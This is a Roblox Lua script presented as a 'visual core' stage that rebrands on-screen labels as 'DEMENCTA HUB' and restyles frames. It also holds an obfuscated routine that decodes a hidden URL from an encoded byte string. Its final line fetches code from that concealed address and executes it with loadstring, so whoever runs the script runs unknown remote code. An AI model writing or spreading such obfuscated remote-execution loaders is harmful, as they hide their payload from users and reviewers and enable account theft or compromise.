
--[[ STAGE 2: VISUAL CORE ]]
local jV10PqP3etmgP7yxXHeZ7="\102\112\118\128\133\082\069\075\156\149\165\098\161\181\190\192\203\194\215\223\211\234\225\235\240\000\247\002\018\206\017\027\035\231\044\051\056\061\071\069\083\085\092\111\098\047\112\134\135\131\145\155\151\160\166\107\179\181\195\194\137\238\207\227\017\018\231\244\243\253\017\005\065\053\040\047\035\046\051\060\113\009\125\129\099\093\100\116\123\121\173\168\147\138\197\162\118\102\131\114\133\239\241\203\219\226\217\221\025\233\203\247\207\220\212\224\239\222\038\053\047"local Pq4Pd3jrEeKOgnLl3=38 local DpgEVRGH6IpWUmIMId4c=251 local nTxMUNurN5pRK=0 local JQxgOYj8Bvit1=6 local _LQnHsUH57V43k3Vsyv0=23 local gGMtw5Cw2lMPgulwMqfDi=false local rFL0fchWjMxYjwxb=bit32 and bit32.bxor if not rFL0fchWjMxYjwxb then rFL0fchWjMxYjwxb=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local wlhtP81QQeHjR={}for JnmYFLIi4YRGMtIhWTBGr8=1,#jV10PqP3etmgP7yxXHeZ7 do local yuXkCSxEpuZRJv3j=string.byte(jV10PqP3etmgP7yxXHeZ7,JnmYFLIi4YRGMtIhWTBGr8)local yfo0MXXWSsshgsliT=(DpgEVRGH6IpWUmIMId4c+(JnmYFLIi4YRGMtIhWTBGr8*JQxgOYj8Bvit1)+_LQnHsUH57V43k3Vsyv0)%256 if nTxMUNurN5pRK==0 then yuXkCSxEpuZRJv3j=(yuXkCSxEpuZRJv3j-yfo0MXXWSsshgsliT)%256 wlhtP81QQeHjR[JnmYFLIi4YRGMtIhWTBGr8]=string.char(rFL0fchWjMxYjwxb(yuXkCSxEpuZRJv3j,Pq4Pd3jrEeKOgnLl3))else yuXkCSxEpuZRJv3j=rFL0fchWjMxYjwxb(yuXkCSxEpuZRJv3j,Pq4Pd3jrEeKOgnLl3)wlhtP81QQeHjR[JnmYFLIi4YRGMtIhWTBGr8]=string.char((yuXkCSxEpuZRJv3j-yfo0MXXWSsshgsliT)%256)end end local sUNrBgk3iCL3C7XaIDU8Kv=table.concat(wlhtP81QQeHjR)if gGMtw5Cw2lMPgulwMqfDi then sUNrBgk3iCL3C7XaIDU8Kv=string.reverse(sUNrBgk3iCL3C7XaIDU8Kv)end local ieU0QBRojxFV=sUNrBgk3iCL3C7XaIDU8Kv
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ieU0QBRojxFV))()
